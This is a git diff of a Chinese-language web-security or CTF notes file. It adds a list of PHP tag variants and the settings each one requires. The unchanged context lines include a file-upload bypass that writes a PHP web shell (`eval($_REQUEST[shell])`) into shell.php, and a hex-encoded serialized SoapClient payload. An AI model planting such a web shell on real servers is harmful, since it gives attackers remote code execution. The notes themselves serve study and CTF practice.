@@ -32,3 +32,17 @@ signature=aaa`,0x4f3a31303a22536f6170436c69656e74223a353a7b733a333a22757269223b7
 - 文件上传bypass，`rm * -nname.jpg`无法删除文件
 - 文件上传bypass，绕过<?php过滤，```<?=`echo '<?php eval($_REQUEST[shell])?>'>shell.php`?>```
 - 文件名爆破
+
+## php文件格式
+```
+<?php ?>
+php默认的开始、结束标签
+<? ?>
+需要开启short_open_tag ，即short_open_tag = On。
+<%%>
+需要开启asp_tags ，即asp_tags = On。
+<?= ?>
+用于输出，等同于- <?php echo ; ?>可以直接使用
+<%= %>
+用于输出，等同于- <?php echo ; ?>，需要开启asp_tags ，才可以使用
+```
